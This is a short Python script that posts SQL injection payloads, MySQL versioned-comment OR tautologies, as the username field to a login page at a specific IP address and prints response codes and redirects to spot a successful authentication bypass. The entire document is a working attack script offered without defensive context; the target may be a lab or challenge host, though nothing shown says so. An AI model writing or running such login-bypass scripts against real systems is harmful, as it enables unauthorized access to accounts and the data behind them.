import requests

payloads = [
    "'/*!50000OR*/'1'>'0",
    "admin'/*!50000OR*/'1'>'0",
    "x'/*!50000OR*/'1'>'0",
]

for p in payloads:
    r = requests.post("http://52.66.177.113/login.php",
                       data={"username": p, "password": "x"},
                       allow_redirects=False)
    print(f"{p!r:45} status={r.status_code} location={r.headers.get('Location')} len={len(r.text)}")
